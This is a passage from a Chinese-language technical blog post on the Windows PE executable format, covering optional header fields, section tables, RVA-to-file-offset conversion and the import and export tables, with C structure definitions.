*PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>事实上，这个结构中的大部分字段都不重要，但有些病毒恰恰利用这些字段做手脚。</p><ul><li><p>AddressOfEntryPoint：指出文件被执行时的入口地址，这是一个RVA地址。如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要将这个入口地址指向附加的代码即可。</p></li><li><p>ImageBase：指出文件的优先装入地址。文件被执行时，如果可能的话，Windows优先将文件装入到由<code>ImageBase</code>字段指定的地址中，只有指定的地址已经被其它模块使用时，文件才被装入到其它地址中。链接器产生可执行文件的时候对应这个地址来生成机器码，所以当文件被装入这个地址时不需要进行重定位操作，装入的速度最快，如果文件被装载到其它地址的话，将不得不进行重定位操作，这样就要慢一点。</p><p>对于EXE文件来说，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其它模块占据，所以EXE总是能够按照这个地址装入，这也意味着EXE文件不再需要重定位信息。</p><p>对于DLL文件来说，由于多个DLL文件全部使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其它的DLL使用，所以DLL文件中必须包含重定位信息以防万一。因此，在前面介绍的<code>IMAGE_FILE_HEADER</code>结构的<code>Characteristics</code>字段中，DLL文件对应的<code>IMAGE_FILE_RELOCS_STRIPPED</code>位总是为0，而EXE文件的这个标志位总是为1。</p><p>在链接的时候，可以通过对<code>link.exe</code>指定<code>/base:address</code>选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定为00400000h，而DLL文件的默认优先装入地址被定为10000000h。</p></li><li><p>SectionAlignment和FileAlignment：<code>SectionAlignment</code>字段指定了节被装入内存后的对齐单位。也就是说，每个节被装入的地址必定是本字段指定数值的整数倍。在内存中对齐默认以1000h为单位。而<code>FileAlignment</code>字段指定了节存储在磁盘文件中时的对齐单位。在磁盘中对齐默认以200h为单位。</p><p>在64位下内存对齐以2000h为单位，如果32位程序想在64位系统下实现兼容，将<code>SectionAlignment</code>值设为2000h即可。</p></li><li><p>Subsystem：指定使用界面的子系统，它的取值如下表所示。这个字段决定了系统如何为程序建立初始的界面，链接时的<code>/subsystem:xxx</code>选项指定的就是这个字段的值。如果将子系统指定为Windows CUI，那么系统会自动为程序建立一个控制台窗口，而指定为Windows GUI的话，窗口必须由程序自己建立。</p><p>| 取值 | Windows.inc中的预定义值        | 含义                       |<br>| —— | ——————————————— | ————————————— |<br>| 0    | IMAGE_SUBSYSTEM_UNKNOWN        | 未知的子系统               |<br>| 1    | IMAGE_SUBSYSTEM_NATIVE         | 不需要子系统（如驱动程序） |<br>| 2    | IMAGE_SUBSYSTEM_WINDOWS_GUI    | Windows图形界面            |<br>| 3    | IMAGE_SUBSYSTEM_WINDOWS_CUI    | Windows控制台界面          |<br>| 5    | IMAGE_SUBSYSTEM_OS2_CUI        | OS2控制台界面              |<br>| 7    | IMAGE_SUBSYSTEM_POSIX_CUI      | POSIX控制台界面            |<br>| 8    | IMAGE_SUBSYSTEM_NATIVE_WINDOWS | 不需要子系统               |<br>| 9    | IMAGE_SUBSYSTEM_WINDOWS_CE_GUI | Windows CE图形界面         |</p></li><li><p>DataDirectory：最重要字段之一，它由16个相同的<code>IMAGE_DATA_DIRECTORY</code>结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个<code>IMAGE_DATA_DIRECTORY</code>结构就是用来定义多种不同用途的数据块的。<code>IMAGE_DATA_DIRECTORY</code>结构的定义很简单，它仅仅指出了某种数据块的位置和长度。</p><p><code>DataDirectory</code>是<code>OptionalHeader</code>的最后128个字节，也是<code>IMAGE_NT_HEADERS</code>的最后一部分数据。</p></li></ul><h2 id="3-4-IMAGE-DATA-DIRECTORY"><a href="#3-4-IMAGE-DATA-DIRECTORY" class="headerlink" title="3.4 IMAGE_DATA_DIRECTORY"></a>3.4 IMAGE_DATA_DIRECTORY</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//数据块的起始RVA</span></span><br><span class="line">    DWORD   Size;<span class="comment">//数据块的长度</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>16个数据目录的含义：</p><img src="/posts/4dec66bb/IMAGE_DATA_DIRECTORY.jpg" class="" title="16个数据目录的含义"><p>在PE文件中寻找特定的数据时就是从这些<code>IMAGE_DATA_DIRECTORY</code>结构开始的，比如要存取资源，那么必须从第3个<code>IMAGE_DATA_DIRECTORY</code>结构（索引为2）中得到资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的哪些API函数，那就必须首先从第2个<code>IMAGE_DATA_DIRECTORY</code>结构得到导入表的位置和大小。</p><h1 id="4-区块表-节表"><a href="#4-区块表-节表" class="headerlink" title="4. 区块表(节表)"></a>4. 区块表(节表)</h1><h2 id="4-1-PE文件到内存的映射"><a href="#4-1-PE文件到内存的映射" class="headerlink" title="4.1 PE文件到内存的映射"></a>4.1 PE文件到内存的映射</h2><p>在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射文件类似的机制。也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系。当且仅当真正执行到某个内存页中的指令或者访问某一页的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大关系。</p><p>需要注意的是，系统装载可执行文件的方法又不完全等同于内存映射文件。当使用内存映射文件的时候，数据本身和数据之间的相对位置是完全相同的；而在装载可执行文件的时候，有些数据在装入前会被预处理，如重定位等，正因此，装入以后，数据之间的相对位置可能发生微妙的变化。</p><p>Windows装载器装载DOS头部、PE文件头和区块表部分是不进行任何特殊处理的，而在装载区块的时候则会自动按区块的属性做不同的处理。</p><p>一般情况下，它会处理以下几个方面的内容：</p><ul><li><p>内存页的属性：对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性设置的。但是在装载可执行文件时，与节对应的内存页属性要按照节的属性来设置。所以，在同属于一个模块的内存页中，从不同节映射过来的内存页的属性是不同的。</p></li><li><p>区块的偏移地址：节的起始地址在磁盘文件中是按照<code>IMAGE_OPTIONAL_HEADER32</code>结构的<code>FileAlignment</code>字段的值进行对齐的，而当被加载到内存中时是按照同一结构中的<code>SectionAlignment</code>字段的值对齐的，两者的值可能不同，所以一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p><p>注意，节事实上就是相同属性数据的组合。当节被装入到内存中的时候，相同一个节所对应的内存页都将被赋予相同的页属性， 事实上，Windows 系统对内存属性的设置是以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小（对于32位操作系统来说，这个值一般是4KB(1000H)；对于64位操作系统这个值一般是8KB(2000H)）。</p><p>节在磁盘中就没有最小4KB的限制，为了减少磁盘文件的大小，文件对齐的单位一般要小于内存对齐的单位(<code>FileAlignment</code>的值一般为200h)，这样，在磁盘中就不必为每个节对齐4KB的大小了。</p></li><li><p>区块的大小：对节的尺寸的处理主要分为两个方面：</p><p>第一个方面，由于磁盘映像和内存映像中节对齐存储单位的不同而导致了长度扩展不同；</p><p>第二个方面，是对于包含未初始化数据的节的处理问题。既然是未初始化，那么没有必要为其在磁盘中浪费空间资源，但在内存中不同，因为程序一运行，之前未初始化的数据便有可能要被赋值初始化，那么就必须为它们留下空间。</p></li><li><p>不进行映射的区块：有些节并不需要被映射到内存中，例如<code>.reloc</code>节，重定位数据对于文件的执行代码来说是透明的，无作用的，它只是提供Windows装载器使用，执行代码根本不会去访问到它们，所以没有必要将它们映射到物理内存中。</p></li></ul><h2 id="4-2-节表"><a href="#4-2-节表" class="headerlink" title="4.2 节表"></a>4.2 节表</h2><p>PE文件中所有节的属性都被定义在节表中，节表由一系列的<code>IMAGE_SECTION_HEADER</code>结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的<code>IMAGE_SECTION_HEADER</code>结构作为结束，所以节表中<code>IMAGE_SECTION_HEADER</code>结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。</p><p>另外，节表中<code>IMAGE_SECTION_HEADER</code>结构的总数总是由PE文件头 <code>IMAGE_NT_HEADERS</code>结构中的<code>FileHeader.NumberOfSections</code>字段来指定的。</p><h2 id="4-3-IMAGE-SECTION-HEADER"><a href="#4-3-IMAGE-SECTION-HEADER" class="headerlink" title="4.3 IMAGE_SECTION_HEADER"></a>4.3 IMAGE_SECTION_HEADER</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//节表名称，如.text</span></span><br><span class="line">    <span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD PhysicalAddress;<span class="comment">//物理地址</span></span><br><span class="line">        DWORD VirtualSize;<span class="comment">//区块尺寸</span></span><br><span class="line">        <span class="comment">//这两个值是一个联合结构，可以使用其中的任何一个，一般取后者</span></span><br><span class="line">    &#125;Misc;                     </span><br><span class="line">    DWORD VirtualAddress;<span class="comment">//区块的RVA地址</span></span><br><span class="line">    DWORD SizeOfRawData;<span class="comment">//在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD PointerToRawData;<span class="comment">//在文件中偏移</span></span><br><span class="line">    DWORD PointerToRelocations;<span class="comment">//在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD PointerToLinenumbers;<span class="comment">//行号表的偏移（供调试使用）</span></span><br><span class="line">    WORD NumberOfRelocations;<span class="comment">//在OBJ文件中使用，重定位项数目</span></span><br><span class="line">    WORD NumberOfLinenumbers;<span class="comment">//行号表中行号的数目</span></span><br><span class="line">    DWORD Characteristics;<span class="comment">//区块属性如可读，可写，可执行等</span></span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>重要字段说明如下：</p><ul><li><p>Name：区块名。这是一个由8位的ASCII码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：<code>.text</code>），但这个“.” 实际上不是必须的。值得注意的是，如果区块名超过8个字节，则没有最后的终止标志“NULL”字节。并且前边带有一个“$”的区块名字会从链接器那里得到特殊的待遇，前边带有“$”的相同名字的区块在载入时候将会被合并，在合并之后的区块中，它们是按照“$”后边的字符的字母顺序进行合并的。</p><p>每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，它的存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data”或者将包含数据的区块命名为“.Code”都是合法的。</p><p>当我们要从PE文件中读取需要的区块的时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照<code>IMAGE_OPTIONAL_HEADER32</code>结构中的数据目录字段结合进行定位。</p></li><li><p>VirtualSize：对表对应的区块的大小，这是区块的数据在没有进行对齐处理前的实际大小。</p></li><li><p>VirtualAddress：该区块装载到内存中的RVA 地址。这个地址是按照内存页来对齐的，因此它的数值总是<code>SectionAlignment</code>的值的整数倍。</p></li><li><p>SizeOfRawData：该区块在磁盘中所占的大小，这个数值等于<code>VirtualSize</code>字段的值按照<code>FileAlignment</code>的值对齐以后的大小。</p></li><li><p>PointerToRawData：指出节在磁盘文件中所处的位置。这个数值是从文件头开始算起的偏移量。</p></li></ul><p>依靠上面4个字段的值，装载器就可以从PE文件中找出某个节(从<code>PointerToRawData</code>偏移开始的<code>SizeOfRawData</code>字节)的数据，并将它映射到内存中去(映射到从模块基地址偏移<code>VirtualAddress</code>的地方，并占用以<code>VirtualSize</code>的值按照页的尺寸对齐后的空间大小)。</p><ul><li>Characteristics：该区块的属性。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。可通过链接器的<code>/SECTION</code>选项设置， 下面是比较重要的标志：</li></ul><div class="table-container"><table><thead><tr><th>字段值</th><th>用途</th></tr></thead><tbody><tr><td>IMAGE_SCN_CNT_CODE<br />0x00000020</td><td>包含代码，常与0x10000000一起设置</td></tr><tr><td>IMAGE_SCN_CNT_INITIALIZED_DATA<br />0x00000040</td><td>该块包含已初始化的数据</td></tr><tr><td>IMAGE_SCN_CNT_UNINITIALIZED_DATA<br /> 0x00000080</td><td>该块包含未初始化的数据</td></tr><tr><td>IMAGE_SCN_MEM_DISCARDABLE<br />0x02000000</td><td>该块可被丢弃，一旦加载可被丢弃的块.reloc(重定位块)</td></tr><tr><td>IMAGE_SCN_MEM_SHARED<br />0x10000000</td><td>共享块</td></tr><tr><td>IMAGE_SCN_MEM_EXECUTE<br />0x20000000</td><td>该块可执行，通常与0x00000020标志一起被设置</td></tr><tr><td>IMAGE_SCN_MEM_READ<br />0x40000000</td><td>该块可读</td></tr><tr><td>IMAGE_SCN_MEM_WRITE<br />0x80000000</td><td>该块可写</td></tr></tbody></table></div><h1 id="5-区块-节"><a href="#5-区块-节" class="headerlink" title="5. 区块(节)"></a>5. 区块(节)</h1><p>通常，区块中的数据在逻辑上是关联的。PE 文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫<code>.rdata</code>，表明它是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。</p><p>区块名称以及意义： </p><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>.text</td><td>默认的区块代码，它的内容全是指令代码</td></tr><tr><td>.data</td><td>默认的读/写数据区块，全局变量、静态变量一般放这</td></tr><tr><td>.rdata</td><td>默认的只读数据区块</td></tr><tr><td>.idata</td><td>包含其他外来DLL的函数及数据信息，即输入表</td></tr><tr><td>.edata</td><td>输出表</td></tr><tr><td>.rsrc</td><td>资源，包含模块的全部资源，如图标、菜单、位图等</td></tr><tr><td>.bss</td><td>未初始化数据</td></tr><tr><td>.tls</td><td>线程局部存储器，包含数据的初始化值，运行时所需要的额外变量</td></tr><tr><td>.reloc</td><td>可执行文件的基址重定位，基址重定位一般仅是DLL文件才需要</td></tr><tr><td>.sdata</td><td>通过全局指针相对寻址的“短”可读/写数据</td></tr><tr><td>.srdata</td><td>通过全局指针相对寻址的“短”只读数据</td></tr><tr><td>.pdata</td><td>异常表</td></tr><tr><td>.debug$S</td><td>OBJ文件中Codeview格式的符号，是一个可变长的Codeview格式符号记录流</td></tr><tr><td>.debug$T</td><td>OBJ文件中Codeview格式的类型记录，是一个可变长的Codeview格式类型记录流</td></tr><tr><td>.debug$P</td><td>使用预编译头时会出现在OBJ文件中</td></tr><tr><td>.drectve</td><td>只用于OBJ文件，包含一些链接器指令</td></tr><tr><td>.didat</td><td>延迟加载的导入数据</td></tr></tbody></table></div><p>在Visual C++中也可以自定义区块名字，用<code>#pragma</code>来声明，告诉编译器插入数据到这个区块内：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;MY_DATA&quot;</span>) </span></span><br></pre></td></tr></table></figure><p>以上语句告诉编译器将数据都放进一个叫“MY_DATA”的区块内，而不是默认的<code>.data</code>区块。区块一般是从OBJ文件开始，被编译器放置的。链接器的工作就是合并左右OBJ和库中需要的块，使其成为一个最终合适的区块。链接器会遵循一套相当完整的规则，它会判断哪些区块被合并以及如何被合并。</p><p>链接器的一个有趣特征就是能够合并区块。如果两个区块有相似、一致的属性(读、写、执行)，那么它们在链接的时候能被合并成一个单一的区块。这取决于是否开启编译器的<code>/merge</code>开关。事实上合并区块有一个好处就是可以节省磁盘的内存空间。</p><p>下面的链接器选项将<code>.rdata</code>与<code>.text</code>区块合并为一个<code>.text</code>区块：<code>/MERGE : .rdata = .text</code></p><p>注意：合并区块时并没有什么硬性规定。例如，把<code>.rdata</code>合并到<code>.text</code>里不会有什么问题，但是不应该将<code>.rsrc</code>、<code>.reloc</code>、<code>.pdata</code>合并到其它的区块里。</p><h2 id="5-1-区块的对齐"><a href="#5-1-区块的对齐" class="headerlink" title="5.1 区块的对齐"></a>5.1 区块的对齐</h2><p>区块大小是要对齐的，有两种对齐值，一种用于磁盘文件内，另一种用于内存中。PE文件头指出了这两个值，它们可以不同。</p><p>PE 文件头里边的<code>FileAligment</code> 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h来填充，这就是区块间的间隙。例如，在PE文件中，一个典型的对齐值是200h，这样，每个区块都将从200h的倍数的文件偏移位置开始，假设第一个区块在400h处，长度为90h，那么从文件400h到490h为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为<code>FileAlignment</code>的整数倍，491h 到 600h 这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。</p><p>PE 文件头里边的<code>SectionAligment</code>定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。一般在x86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64上，是按8KB（2000h）来排列的。所以在x86 系统中，PE文件区块的内存对齐值一般等于1000h，每个区块按1000h的倍数在内存中存放。</p><h2 id="※5-2-RVA到FOA的转换"><a href="#※5-2-RVA到FOA的转换" class="headerlink" title="※5.2 RVA到FOA的转换"></a>※5.2 RVA到FOA的转换</h2><p>RVA是当PE文件被装载到内存中后，某个数据位置相对于文件头的偏移量。如果Windows装载器将一个PE文件装入到00400000h处的内存中，而某个区块中的某个数据被装入0040xxxxh处，那么这个数据的RVA就是(0040xxxxh-00400000h=)xxxxh。反过来说，将RVA的值加上文件被装载的基地址，就可以找到数据在内存中的实际地址。</p><p>RVA使文件装入内存后的数据定位变得方便，然后却给我们要定位位于磁盘上的静态PE文件带来了麻烦。</p><p>当处理PE文件的时候，任何的RVA必须经过到FOA的换算，才能用来定位并访问文件中的数据，但换算却无法用一个简单的公式来完成。事实上，唯一可用的方法就是穷举，步骤如下：</p><ol><li>循环扫描区块表得出每个区块在内存中的起始RVA(<code>IMAGE_SECTION_HEADER</code>的<code>VirtualAddress</code>字段)，并根据区块大小(<code>IMAGE_SECTION_HEADER</code>的<code>SizeOfRawData</code>字段)算出区块的结束RVA(两者相加即可)，最后判断目标RVA是否落在该区块内。</li><li>已知目标RVA在哪个区块后，用目标RVA减去该区块的起始RVA，这样就能得到目标RVA相对于起始RVA的偏移量RVA2。</li><li>在区块表中获取该区块在文件中所处的偏移地址(根据<code>IMAGE_SECTION_HEADER</code>中的<code>PointerToRawData</code>字段)，将这个偏移值加上RVA2得到真正的文件偏移地址(FOA)。</li></ol><img src="/posts/4dec66bb/RVA%E4%B8%8EFOA.png" class="" title="RVA到FOA的转换"><p>举个例子，求目标RVA为0x198000的文件偏移地址。</p><img src="/posts/4dec66bb/5.2.1.png" class="" title="RVA到FOA的转换例子"><p><code>.text</code>结束RVA = 0x1000 + 0x176ade = 0x177ade &lt; 0x198000</p><p><code>.rdata</code>结束RVA = 0x178000 + 0x4d896 = 0x1c5896 &gt; 0x198000</p><p>所以目标RVA在<code>.rdata</code>段。</p><p>目标RVA相对于<code>.rdata</code>起始RVA的偏移 = 0x198000 - 0x178000 = 0x20000</p><p><code>.rdata</code>段在磁盘文件中的偏移地址 = 0x177000</p><p>所以目标RVA在磁盘文件的偏移地址 = 0x177000 + 0x20000 = 0x197000</p><h2 id="5-3-输入表"><a href="#5-3-输入表" class="headerlink" title="5.3 输入表"></a>5.3 输入表</h2><h3 id="5-3-1-输入函数"><a href="#5-3-1-输入函数" class="headerlink" title="5.3.1 输入函数"></a>5.3.1 输入函数</h3><p>在代码分析或编程中经常遇到“输入函数”的概念，输入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于相关的DLL文件中，在调用者程序中只保留相关的函数信息(如函数名、DLL文件名等)即可。对于磁盘上的PE文件来说，它无法得知这些输入函数在内存中的地址，只有当PE文件被装入内存后，Windows加载器才将相关DLL装入，并将调用输入函数的指令和函数实际所处的地址联系起来，这就是“动态链接”的概念。动态链接是通过PE文件中定义的“输入表”来完成的，输入表中保存的正是函数名和其驻留的DLL名等。</p><h3 id="5-3-2-IMAGE-IMPORT-DESCRIPTOR"><a href="#5-3-2-IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="5.3.2 IMAGE_IMPORT_DESCRIPTOR"></a>5.3.2 IMAGE_IMPORT_DESCRIPTOR</h3><p>PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>的第二个成员就是指向输入表。而输入表是以一个<code>IMAGE_IMPORT_DESCRIPTOR</code>(简称IID)的数组开始。每个被PE文件链接进来的DLL文件都分别对应一个IID数组结构。在这个IID数组中，并没有指出有多少个链接文件，但它最后是以一个全为0(NULL)的IID作为结束的标志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span><span class="comment">//共用体类型，共占同一个地址，分时用</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">DWORD    OriginalFirstThunk;<span class="comment">//指向输入名称表(INT)RVA的结构数组</span></span><br><span class="line">    &#125;;</span><br><span class="line">DWORD     TimeDateStamp;</span><br><span class="line">DWORD     ForwarderChain;</span><br><span class="line">DWORD     Name;<span class="comment">//指向被输入的DLL名称</span></span><br><span class="line">DWORD     FirstThunk;<span class="comment">//指向输入地址表(IAT)RVA，IAT是一个IMAGE_THUNK_DATA结构的数组</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>重要字段如下：</p><ul><li>OriginalFirstThunk：指向输入名称表(INT)RVA的结构数组，数组类型为<code>IMAGE_THUNK_DATA</code>。</li><li>Name：指向存有DLL名称的相对虚拟地址。</li><li>FirstThunk：指向输入地址表(IAT)RVA的结构数组，数组类型为<code>IMAGE_THUNK_DATA</code>。</li></ul><img src="/posts/4dec66bb/5.3.4.png" class="" title="导入表相互关系"><p><code>FirstThunk</code>指向的<code>IMAGE_THUNK_DATA</code>数组中的<code>Function</code>保存的就是真实内存中的函数地址，<code>OriginalFirstThunk</code>指向的同样是<code>IMAGE_THUNK_DATA</code>数组，但是保存的并不是真实内存中的函数地址，而是<code>IMAGE_IMPORT_BY_NAME</code>数组的RVA，保存的是导入函数的文件名。</p><h3 id="5-3-3-IMAGE-THUNK-DATA32"><a href="#5-3-3-IMAGE-THUNK-DATA32" class="headerlink" title="5.3.3 IMAGE_THUNK_DATA32"></a>5.3.3 IMAGE_THUNK_DATA32</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">       DWORD ForwarderString;<span class="comment">//指向一个转向字符串的RVA</span></span><br><span class="line">       DWORD Function; <span class="comment">//被输入的函数的内存地址</span></span><br><span class="line">       DWORD Ordinal; <span class="comment">//被输入的API的序数值</span></span><br><span class="line">       DWORD AddressOfData;<span class="comment">//指向IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">    &#125;u1;</span><br><span class="line">&#125;IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="comment">//IMAGE_THUNK_DATA64与IMAGE_THUNK_DATA32的区别，仅仅是把DWORD换成了64位整数。</span></span><br></pre></td></tr></table></figure><p><code>IMAGE_THUNK_DATA</code>只占一个双字字节，当双字字节的最高位为1时，表示函数以序号方式输入，这时候低31位被看作一个函数序号。当双字字节的最高位为0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个RVA，指向一个<code>IMAGE_IMPORT_BY_NAME</code>结构。</p><h3 id="5-3-4-IMAGE-IMPORT-BY-NAME"><a href="#5-3-4-IMAGE-IMPORT-BY-NAME" class="headerlink" title="5.3.4 IMAGE_IMPORT_BY_NAME"></a>5.3.4 IMAGE_IMPORT_BY_NAME</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//指出函数在所在的dll的输出表中的序号        </span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];<span class="comment">//指出要输入的函数的函数名</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>结构中的<code>Hint</code>字段也表示函数的序号，不过这个字段是可选的，有些编译器总是将它设置为 0，<code>Name</code>字段定义了导入函数的名称字符串，这是一个以 0 为结尾的字符串。</p><h3 id="※5-3-5-输入地址表-IAT"><a href="#※5-3-5-输入地址表-IAT" class="headerlink" title="※5.3.5 输入地址表(IAT)"></a>※5.3.5 输入地址表(IAT)</h3><p>为什么由两个并行的指针数组同时指向<code>IMAGE_IMPORT_BY_NAME</code>结构呢？第一个数组(由<code>OriginalFirstThunk</code>所指向)是单独的一项，而且不能被改写。第二个数组(由<code>FirstThunk</code>所指向)由PE装载器重写，这就是PE装载器的核心操作。</p><p>PE装载器首先搜索<code>OriginalFirstThunk</code>，找到后加载程序迭代搜索数组中的每个指针，找到每个<code>IMAGE_IMPORT_BY_NAME</code>结构所指向的输入函数的地址，然后加载器用函数真正入口地址来代替由<code>FirstThunk</code>数组中的一个入口，因此我们称为输入地址表(IAT)。</p><img src="/posts/4dec66bb/5.3.5.png" class="" title="输入地址表"><p>此时，输入表中其它部分就不重要了，程序依靠IAT提供的函数地址就可以正常运行。</p><p><a href="https://www.bilibili.com/video/BV1us411P7nL?p=9">找到输入表在PE文件中的地址和被加载进内存的地址 空降18:38</a></p><h2 id="5-4-输出表"><a href="#5-4-输出表" class="headerlink" title="5.4 输出表"></a>5.4 输出表</h2><p>当PE文件被执行的时候，Windows加载器将文件装入内存并将导入表登记的动态链接库(一般是DLL格式)文件一并装入地址空间，再根据DLL文件中的函数导出信息，对可执行文件的IAT进行修正。</p><p>动态链接库是被映射到其它应用程序的地址空间中执行的，它和应用程序可以看成是“一体”的，动态链接库可以使用应用程序的资源，它所拥有的资源也可以被应用程序使用，它的任何操作都是代表应用程序进行的，当动态链接库进行打开文件、分配内存和创建窗口等操作后，这些文件、内存和窗口都是为应用程序所拥有的。</p><p>导出表就是记载着动态链接库的一些导出信息。通过导出表，DLL 文件可以向系统提供导出函数的名称、序号和入口地址等信息，比便Windows 加载器通过这些信息来完成动态连接的整个过程。</p><p>注意：扩展名为<code>.exe</code>的PE文件一般不存在导出表，而大部分的<code>.dll</code>文件中都包含导出表。但注意，这并不是绝对。比如纯粹用作资源的<code>.dll</code>文件不需要导出函数，有些特殊功能的<code>.exe</code>文件也会存在导出函数。</p><h3 id="5-4-1-导出表结构"><a href="#5-4-1-导出表结构" class="headerlink" title="5.4.1 导出表结构"></a>5.4.1 导出表结构</h3><p>PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>的第一个成员就是指向导出表。导出表是用来描述模块中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过<code>GetProcAddress()</code>函数就能动态获取到函数的地址。函数导出的方式有两种，一种是按名字导出，一种是按序号导出。这两种导出方式在导出表中的描述方式也不相同。</p><p>导出表（Export Table）中的主要成分是一个表格，内含函数名称、输出序数等。序数是指定DLL 中某个函数的16位数字，在所指向的DLL 文件中是独一无二的。在此不提倡仅仅通过序数来索引函数的方法，这样会给DLL 文件的维护带来问题。例如当DLL 文件一旦升级或修改就可能导致调用改DLL 的程序无法加载到需要的函数。</p><h3 id="5-4-2-IMAGE-EXPORT-DIRECTORY"><a 